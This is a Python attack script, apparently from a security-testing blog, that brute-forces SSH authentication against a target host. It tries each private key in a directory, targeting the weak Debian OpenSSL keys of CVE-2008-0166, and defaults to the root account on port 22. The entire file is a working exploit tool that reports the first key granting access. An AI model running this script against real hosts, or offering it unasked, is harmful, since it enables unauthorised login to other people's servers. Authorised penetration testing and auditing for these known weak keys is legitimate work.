#!/usr/bin/env python3
#=========================================================#
# [+] Title: SSH Weak Private Keys Brute Force            #
#            CVE: 2008-0166                               #
# [+] Script: sshbrute_pkey.py                            #
# [+] Blog: pytesting.blogspot.com                        #
#=========================================================#

import os
import paramiko
import socket
from optparse import OptionParser

def brute_pkey(target, usr, sshport, pkeys_dir):
    if pkeys_dir[-1]!="\\":
        pkeys_dir+="\\"
    try:
        for pk in os.listdir(pkeys_dir):
            pk=pkeys_dir+pk
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target, sshport, usr, key_filename=pk)
                print("[+] Private Key Found: %s"%pk)
                break;
            except paramiko.SSHException as e:
                print("[-] %s: %s"%(str(e), pk))
            except paramiko.AuthenticationException:
                print("[-] Permission Denied: %s"%pk)
                ssh.close()
            except socket.error:
                print("[-] Failed to establish a connection")
                break;
        ssh.close()
    except:
        print("[-] Invalid Path: %s"%pkeys_dir)

    

def main():
    parser=OptionParser()
    parser.add_option("-t", "--target", dest="target", type="string",
                      help="Target to brute force the password",
                      metavar="IP/URL")
    parser.add_option("-u", "--user", dest="user", type="string",
                       help="target session username", metavar="USERNAME", default="root")
    parser.add_option("-p", "--port", dest="port", type="int",
                      help="SSH Port", metavar="Port", default=22)
    parser.add_option("-d", "--pkeydir", dest="pkeydir", type="string",
                      help="Private Keys directory", metavar="DIR")

    options, args=parser.parse_args()

    if options.target and options.pkeydir:
        brute_pkey(options.target, options.user, options.port, options.pkeydir)
    else:
        parser.print_help()

if __name__=="__main__":
    main()



